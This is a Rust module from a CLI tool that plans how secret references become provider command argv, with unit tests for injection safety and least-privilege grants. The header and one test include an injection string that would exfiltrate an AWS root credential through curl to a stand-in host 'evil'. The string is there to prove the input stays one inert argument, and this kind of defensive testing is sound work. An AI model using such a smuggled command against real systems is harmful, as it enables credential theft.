//! Secret resolution, **the half of it that never sees a value**.
//!
//! `armada.yml` declares a *reference* — `GITHUB_TOKEN: op://Engineering/github/token`
//! — and a *provider* — `op: { cmd: "op read op://${ref}" }`. Turning the first
//! into an argv for the second is a pure decision over two strings, so it lives
//! here; running that argv and holding what it prints is I/O, so it lives in the
//! shell (`armada_helm::secrets`).
//!
//! **The split is the enforcement, not a tidiness preference.**
//! `ARCHITECTURE.md` §1.8: *a pure function that has never seen a value cannot
//! leak one.* Every type in this module holds a name, a scheme or a reference —
//! there is deliberately nowhere here to put a resolved value, exactly as
//! [`armada_guild::secrets`] has deliberately no `fn withheld_value()`.
//!
//! # Rule 1 is the reason this is a module and not four lines at the call site
//!
//! `PLAN.md` §4.7 rule 1: **`${ref}` is passed as a single argv element, never
//! through a shell.** The provider `cmd` is split *first* — by
//! [`crate::template::split_argv`], the same grammar and the same ordering
//! `${files}` uses and for the same reason — and the reference is then dropped
//! into whichever token mentions it. So
//!
//! ```text
//! secrets:  { X: "op://a; curl evil/$(op read op://Private/AWS/root)" }
//! providers: { op: { cmd: "op read op://${ref}" } }
//! ```
//!
//! becomes `["op", "read", "op://a; curl evil/$(op read op://Private/AWS/root)"]`
//! — three argv elements, no shell, and the injection reads as an inert URI in
//! review because that is all it ever was. Substituting into the string and
//! splitting afterwards would execute it. There is no `shell:` key on a
//! provider and the schema forbids one, so this path has no bypass.
//!
//! # What `${ref}` is, exactly
//!
//! **Everything after `://`.** The schema is the authority on the config
//! contract and says so — `secretRef` is `^[a-z0-9][a-z0-9+.-]*://.+` and
//! *"the scheme selects a declared provider; everything after it is substituted
//! into that provider's `${ref}`"* — and [`crate::verify`] already reads the
//! scheme as `reference.split("://").next()`, so the complement is the only
//! reading that leaves no characters unaccounted for.
//!
//! It follows that a 1Password provider is written `op read op://${ref}` rather
//! than `op read ${ref}`: the scheme is the routing key, and a provider that
//! wants it back in its argument says so. `PLAN.md` §4.7's example omits the
//! second `op://` and is the one place the two documents disagree; the schema
//! wins (`AGENTS.md`, *"the JSON Schema is authoritative"*), and nothing is lost
//! because both spellings are expressible.

use crate::config::ResolvedConfig;
use crate::error::{ArmadaError, ConfigWhere};
use crate::template;
use std::collections::{BTreeMap, BTreeSet};

/// The placeholder a provider `cmd` must contain.
pub const REF: &str = "${ref}";

/// One reference, split at the `://` that decides which provider answers it.
///
/// **Two `&str`s and no third field.** There is no room here for what the
/// provider printed, which is the point: this type crosses into the core and a
/// resolved value never does.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct Reference<'a> {
    /// The URI scheme, which names a `secret_providers:` entry.
    pub scheme: &'a str,
    /// Everything after `://` — what `${ref}` becomes.
    pub reference: &'a str,
}

/// Split a reference, or say why it is not one.
///
/// The schema already rejects a reference with no `://`, so this failing means
/// the document reached here without being validated — which happens, because
/// `config verify` is a verb and not a precondition of every other one.
pub fn split(reference: &str) -> Option<Reference<'_>> {
    let (scheme, rest) = reference.split_once("://")?;
    if scheme.is_empty() || rest.is_empty() {
        return None;
    }
    Some(Reference {
        scheme,
        reference: rest,
    })
}

/// One provider invocation, fully decided: which secret, which provider, and
/// the exact argv.
///
/// **The argv is carried rather than rebuilt at the call site.** It is the same
/// rule [`crate::schedule::Plan`] follows — the seam never re-parses anything,
/// and a unit test can assert the exact vector that would have been executed,
/// which for rule 1 is the whole proof.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct Call {
    /// The environment variable this resolves.
    pub name: String,
    /// The provider that answers it, by scheme. **Named in every error**, so a
    /// failure says which of four providers to go and look at.
    pub provider: String,
    /// Program and arguments, already split, with `${ref}` substituted as one
    /// element.
    pub argv: Vec<String>,
}

/// The provider calls that would resolve `wanted`, in name order.
///
/// **One call per secret name, however many entries granted it.** `PLAN.md`
/// §4.7's in-memory cache is not a separate mechanism: a run granting one
/// secret to twenty checks asks for twenty names, `wanted` is a set, and `op`
/// prompts once. The cache being the shape of this function rather than a map
/// somebody remembers to consult is what stops a later call site skipping it.
///
/// **Order is deterministic** because a person watching four biometric prompts
/// should get them in the same order twice.
pub fn plan(
    config: &ResolvedConfig,
    wanted: &BTreeSet<String>,
    file: &str,
) -> Result<Vec<Call>, ArmadaError> {
    let mut calls = Vec::new();
    for name in wanted {
        calls.push(call_for(config, name, file)?);
    }
    Ok(calls)
}

fn call_for(config: &ResolvedConfig, name: &str, file: &str) -> Result<Call, ArmadaError> {
    let at = |path: String| ConfigWhere::Path {
        file: file.to_string(),
        path,
    };

    // Every one of these three is what `config verify` reports as a `references`
    // finding. Reaching them here means the run started without one, so the
    // message has to stand on its own rather than say "run verify".
    let Some(reference) = config.secrets.get(name) else {
        return Err(ArmadaError::bad_config(
            at(format!("secrets.{name}")),
            format!("`secrets: [{name}]` names nothing declared under `secrets:`"),
            format!("declare `{name}:` with the reference that fetches it"),
        ));
    };
    let Some(parsed) = split(reference) else {
        return Err(ArmadaError::bad_config(
            at(format!("secrets.{name}")),
            format!("`{name}`'s reference is not `<scheme>://<ref>`"),
            "write it as `<scheme>://<ref>` — the scheme picks the provider".to_string(),
        ));
    };
    let Some(cmd) = config.secret_providers.get(parsed.scheme) else {
        return Err(ArmadaError::bad_config(
            at(format!("secrets.{name}")),
            format!(
                "`{name}` uses the `{}` scheme, which no `secret_providers:` entry declares",
                parsed.scheme
            ),
            format!(
                "add `secret_providers: {{ {}: {{ cmd: … }} }}`",
                parsed.scheme
            ),
        ));
    };

    Ok(Call {
        name: name.to_string(),
        provider: parsed.scheme.to_string(),
        argv: provider_argv(
            cmd,
            parsed.reference,
            &at(format!("secret_providers.{}.cmd", parsed.scheme)),
        )?,
    })
}

/// Split a provider `cmd` and put the reference in, **as one argv element**.
///
/// See the module header: the split is first and the substitution is second,
/// which is what makes a reference containing `;`, a space or `$(…)` an
/// argument rather than a program.
pub fn provider_argv(
    cmd: &str,
    reference: &str,
    at: &ConfigWhere,
) -> Result<Vec<String>, ArmadaError> {
    let tokens = template::split_argv(cmd, at)?;
    if !tokens.iter().any(|token| token.contains(REF)) {
        // The schema requires `${ref}`; a provider that reached here without one
        // would run the same argv for every secret and print the wrong value —
        // silently, and to the right variable name.
        return Err(ArmadaError::bad_config(
            at.clone(),
            "a provider `cmd` with no `${ref}` can never resolve anything",
            "put `${ref}` where the reference belongs in the command",
        ));
    }
    // `replace` rather than "the token *is* `${ref}`", so `op read op://${ref}`
    // and `--secret-id=${ref}` both work — the token count is unchanged either
    // way, which is the property rule 1 actually asks for.
    Ok(tokens
        .into_iter()
        .map(|token| token.replace(REF, reference))
        .collect())
}

/// Every secret name granted anywhere in `plans`, deduplicated.
///
/// Takes the grants rather than the config because *the run* decides what is
/// needed: `armada manifest check --component api` must not make somebody touch
/// a hardware key for the token only `web` was granted.
pub fn wanted<'a>(grants: impl IntoIterator<Item = &'a [String]>) -> BTreeSet<String> {
    grants
        .into_iter()
        .flat_map(|names| names.iter().cloned())
        .collect()
}

/// The subset of an environment a single entry was granted.
///
/// **Least privilege, applied at the last possible moment** (`PLAN.md` §4.7
/// rule 5). The vault holds every value this run resolved; a check sees only
/// the names its own `secrets:` listed, and a sibling with no grant sees none —
/// which is the assertion §4.7 rule 5 asks for by name.
pub fn granted(vault: &BTreeMap<String, String>, names: &[String]) -> BTreeMap<String, String> {
    names
        .iter()
        .filter_map(|name| vault.get(name).map(|value| (name.clone(), value.clone())))
        .collect()
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::config::{parse, resolve, Defaults};

    /// The provider fixtures, in the spelling this module settled on: the
    /// scheme is the routing key and a provider that wants it in its argument
    /// puts it back. See the module header.
    const CONFIG: &str = "\
manifest:
  version: 1
  secrets:
    GITHUB_TOKEN: op://Engineering/github/token
    DB_PASSWORD: keychain://prod-db
  secret_providers:
    op: { cmd: \"op read op://${ref}\" }
    keychain: { cmd: \"security find-generic-password -s ${ref} -w\" }
  commands:
    deploy: { cmd: ./deploy, secrets: [GITHUB_TOKEN] }
";

    fn resolved(yaml: &str) -> ResolvedConfig {
        let parsed = parse(yaml, "armada.yml").expect("the fixture parses");
        resolve(parsed, &Defaults::built_in(), "armada.yml").expect("the fixture resolves")
    }

    fn names(list: &[&str]) -> BTreeSet<String> {
        list.iter().map(|n| (*n).to_string()).collect()
    }

    fn at() -> ConfigWhere {
        ConfigWhere::Path {
            file: "armada.yml".to_string(),
            path: "secret_providers.op.cmd".to_string(),
        }
    }

    /// The reference splits at `://` and the scheme is what routes it.
    #[test]
    fn a_reference_splits_into_a_scheme_and_the_rest() {
        let parsed = split("op://Engineering/github/token").unwrap();
        assert_eq!(parsed.scheme, "op");
        assert_eq!(parsed.reference, "Engineering/github/token");
        // A `#` fragment and a second `://` are both part of the reference —
        // the split is on the *first* separator, because the scheme is the only
        // thing Armada reads.
        assert_eq!(
            split("aws-sm://prod/db#password").unwrap().reference,
            "prod/db#password"
        );
        assert_eq!(split("x://https://y").unwrap().reference, "https://y");
    }

    /// The shapes the schema rejects, rejected again here — because `check` runs
    /// without `config verify` having been run first.
    #[test]
    fn a_reference_with_nothing_on_one_side_is_not_a_reference() {
        for bad in ["", "op", "op://", "://a", "no-separator/a"] {
            assert!(split(bad).is_none(), "`{bad}` was accepted");
        }
    }

    /// **Rule 1, and this is its proof.** The injection is one argv element, so
    /// nothing splits it and nothing interprets it.
    #[test]
    fn an_injection_in_a_reference_stays_one_argument() {
        let evil = "a; curl evil/$(op read op://Private/AWS/root)";
        let argv = provider_argv("op read op://${ref}", evil, &at()).unwrap();
        assert_eq!(
            argv,
            vec!["op", "read", &format!("op://{evil}")],
            "the reference was word-split or shelled"
        );
    }

    /// A reference with a space is one argument too — the same property, and the
    /// one a naive `format!` plus split gets wrong first.
    #[test]
    fn a_reference_with_whitespace_stays_one_argument() {
        let argv = provider_argv(
            "security find-generic-password -s ${ref} -w",
            "My Service Login",
            &at(),
        )
        .unwrap();
        assert_eq!(argv.len(), 5, "{argv:?}");
        assert_eq!(argv[3], "My Service Login");
    }

    /// `${ref}` is substituted wherever it appears in a token, so a provider can
    /// put the scheme back or attach it to a flag.
    #[test]
    fn the_placeholder_may_be_part_of_a_token() {
        assert_eq!(
            provider_argv("aws sm get --secret-id=${ref}", "prod/db", &at()).unwrap(),
            vec!["aws", "sm", "get", "--secret-id=prod/db"]
        );
    }

    /// A provider that mentions no reference would answer every secret with the
    /// same value, under the right variable name. That is worse than failing.
    #[test]
    fn a_provider_command_without_the_placeholder_is_refused() {
        let error = provider_argv("cat /etc/token", "a/b", &at()).unwrap_err();
        assert!(error.message.contains("${ref}"), "{}", error.message);
    }

    /// A grant reaches only the entry that declared it.
    #[test]
    fn only_the_granted_names_come_out_of_the_vault() {
        let vault = BTreeMap::from([
            ("A".to_string(), "value-a".to_string()),
            ("B".to_string(), "value-b".to_string()),
        ]);
        let given = granted(&vault, &["A".to_string()]);
        assert_eq!(given.len(), 1);
        assert_eq!(given.get("A").map(String::as_str), Some("value-a"));
        assert!(
            !given.contains_key("B"),
            "an ungranted secret was handed over"
        );
    }

    /// A grant naming something undeclared resolves nothing rather than an
    /// empty string — a variable set to `""` reads as configured and is not.
    #[test]
    fn a_grant_with_nothing_behind_it_sets_no_variable() {
        let vault = BTreeMap::new();
        assert!(granted(&vault, &["A".to_string()]).is_empty());
    }

    /// The whole plan, on the config shape it will actually meet: one call per
    /// wanted name, each naming its provider and carrying the exact argv.
    #[test]
    fn the_plan_names_the_provider_and_carries_the_argv() {
        let config = resolved(CONFIG);
        let calls = plan(
            &config,
            &names(&["DB_PASSWORD", "GITHUB_TOKEN"]),
            "armada.yml",
        )
        .unwrap();
        assert_eq!(
            calls,
            vec![
                Call {
                    name: "DB_PASSWORD".to_string(),
                    provider: "keychain".to_string(),
                    argv: vec![
                        "security".to_string(),
                        "find-generic-password".to_string(),
                        "-s".to_string(),
                        "prod-db".to_string(),
                        "-w".to_string(),
                    ],
                },
                Call {
                    name: "GITHUB_TOKEN".to_string(),
                    provider: "op".to_string(),
                    argv: vec![
                        "op".to_string(),
                        "read".to_string(),
                        "op://Engineering/github/token".to_string(),
                    ],
                },
            ]
        );
    }

    /// **Nothing is planned for a secret this run was not going to use.**
    /// `check --component web` must not make somebody touch a hardware key for
    /// `api`'s token.
    #[test]
    fn a_secret_no_selected_entry_wants_is_never_planned() {
        let config = resolved(CONFIG);
        assert!(plan(&config, &names(&[]), "armada.yml").unwrap().is_empty());
        let one = plan(&config, &names(&["GITHUB_TOKEN"]), "armada.yml").unwrap();
        assert_eq!(one.len(), 1);
        assert_eq!(one[0].name, "GITHUB_TOKEN");
    }

    /// The three `references` findings, each standing on its own — `check` runs
    /// without `config verify` having been run first, so "run verify" is not an
    /// answer.
    #[test]
    fn a_plan_that_cannot_be_made_says_which_secret_and_why() {
        let config = resolved(CONFIG);
        let undeclared = plan(&config, &names(&["NOPE"]), "armada.yml").unwrap_err();
        assert!(undeclared.message.contains("NOPE"), "{undeclared:?}");

        let orphan = resolved(
            "manifest:\n  version: 1\n  secrets:\n    T: vault://a/b\n  \
             commands:\n    x: { cmd: ./x, secrets: [T] }\n",
        );
        let error = plan(&orphan, &names(&["T"]), "armada.yml").unwrap_err();
        assert!(error.message.contains("`vault`"), "{error:?}");
        assert!(error.message.contains('T'), "{error:?}");
    }

    /// Twenty grants of one name are one call, which for `op` is one prompt.
    #[test]
    fn the_same_secret_granted_many_times_is_wanted_once() {
        let one = vec!["T".to_string()];
        let two = vec!["T".to_string(), "U".to_string()];
        let set = wanted([one.as_slice(), two.as_slice(), one.as_slice()]);
        assert_eq!(set.into_iter().collect::<Vec<_>>(), vec!["T", "U"]);
    }
}
